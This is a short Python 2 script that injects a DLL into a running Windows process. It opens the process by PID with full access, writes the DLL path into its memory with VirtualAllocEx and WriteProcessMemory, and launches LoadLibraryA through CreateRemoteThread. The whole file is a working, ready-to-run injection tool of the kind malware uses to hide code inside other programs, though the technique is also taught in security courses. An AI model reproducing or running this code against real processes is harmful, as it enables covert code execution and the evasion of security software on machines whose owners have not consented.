'''
Created on 29 Aug 2017

@author: Muhammad Arslan <rslnkrmt2552@gmail.com>
'''

import sys
from ctypes import *

PAGE_READWRITE = 0X04
PROCESS_ALL_ACCESS = ( 0X000F0000 | 0X00100000 | 0XFFF)
VIRTUAL_MEM = ( 0X1000 | 0X2000 )

kernel32 = windll.kernel32
pid = sys.argv[1]
dll_path = sys.argv[2]
dll_len  = len(dll_path)

h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))

if not h_process:
    print "[*] Couldn't acquire a handle to PID: %s" % pid
    sys.exit(0)

arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)

written = c_int(0)

kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))

h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")

thread_id = c_ulong(0)

if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id)):
    print "[*] Failed to inject the DLL. Exiting..."
    sys.exit(0)

print "[*] Remote thread with ID 0x%08x created." % thread_id.value